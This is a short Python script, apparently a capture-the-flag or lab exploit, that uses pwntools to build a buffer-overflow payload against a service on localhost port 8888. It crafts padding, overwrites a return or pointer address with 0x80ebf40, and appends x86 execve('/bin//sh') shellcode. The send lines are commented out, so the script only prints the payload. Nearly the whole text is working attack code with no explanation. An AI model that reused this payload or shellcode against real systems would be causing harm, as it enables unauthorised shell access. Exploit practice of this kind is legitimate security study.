
import socket
import struct
import sys
from pwn import *
#def recv_until(s, mark):
#	res = ''
#	while True:
#		c = s.recv(1)
#		if c=='':
#			break
#		res += c
#		if mark in res:
#			break
#	return res

#host = "localhost"

#s = socket.create_connection((host, 8888))

pl = ''
alpha = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q']
for i in range(1, 100):
	if(i <= 17):
		pl += alpha[i-1]*7 + chr(i)
	if(i == 17):
		pl += p32(0x80ebf40)+"AAA"+chr(i)
	else:
		pl += "A"*7+chr(i)
shellcode = "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
pl += p32(0x80ebf40) + "AAA" + chr(18) + shellcode
print pl
#print recv_until(s, "\n")
#s.sendall(pl)
#print recv_until(s, "\n")
